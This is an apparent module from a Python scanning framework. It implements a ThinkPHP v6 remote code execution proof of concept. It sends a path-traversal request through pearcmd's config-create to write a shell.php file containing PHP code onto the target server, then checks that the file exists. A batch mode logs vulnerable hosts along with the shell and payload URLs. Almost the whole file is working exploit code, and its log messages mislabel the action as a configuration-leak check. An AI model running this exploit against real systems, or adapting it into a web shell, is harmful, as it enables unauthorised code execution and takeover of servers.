#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from libs.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from libs.reqset import ReqSet
from libs.output import OutPutFile
urllib3.disable_warnings()


class ThinkPhpV6:
    def poc(self, target):
        url = target + "/public/index.php?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=phpinfo()?>+shell.php"

        url1 = target + "/shell.php"
        try:
            res1 = requests.get(url1, headers=self.headers, verify=self.verify, proxies=self.proxy, timeout=5).text
            res = requests.get(url, headers=self.headers, verify=self.verify, proxies=self.proxy, timeout=5).text
            if " pear.php.net" in res:
                if "phpinfo()" in res1:
                    OutPrintInfoSuc("ThinkPHP", f"{target} is valueable")
                    if not self.batch:
                        OutPrintInfo("ThinkPHP", f"SHELL-URL: {url1}")
                        OutPrintInfo("ThinkPHP", f"PAYLOAD: {url}")
                    else:
                        OutPutFile("thinkphp_v6_rce.txt", f"{target} is valueable | SHELL-URL: {url1} | PAYLOAD: {url}")
            else:
                if not self.batch:
                    OutPrintInfo("ThinkPHP", f"{target} is not valueable")
        except:
            if not self.batch:
                OutPrintInfo("ThinkPHP", f"{target} Error")

    def main(self, target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        proxy = target["proxy"]
        self.verify = target["ssl"]

        if not self.batch:
            req = ReqSet(header=header, proxy=proxy)
            self.proxy = req["proxy"]
            self.headers = req["header"]
        else:
            self.proxy = {"http": proxy, "https": proxy}
            req = ReqSet(header=header)
            self.headers = req["header"]
        if not self.batch:
            OutPrintInfo("ThinkPHP", '开始检测配置文件泄漏...')
        self.poc(url)
        if not self.batch:
            OutPrintInfo("ThinkPHP", '开始检测配置文件泄漏...')